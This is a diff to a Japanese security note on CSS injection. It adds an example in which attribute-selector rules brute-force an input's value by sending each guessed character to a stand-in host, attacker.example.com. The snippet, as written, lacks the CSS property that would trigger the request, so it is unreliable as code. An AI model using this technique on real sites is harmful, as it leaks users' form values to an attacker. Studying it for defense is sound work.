@@ -34,9 +34,15 @@ body {
 
 ## Injection
 
-Attribute Selector と URL 関数を利用することで、ユーザの入力した値を取得することができる。
+Attribute Selector と URL 関数を利用することで、属性の値を調べることができる。
 簡潔に言うと、総当りする。
 
 ```css
-input[value^=]
+input[value^=a] {
+	url(http://attacker.example.com/?value=a);
+}
+input[value^=b] {
+	url(http://attacker.example.com/?value=b);
+}
+......
 ```
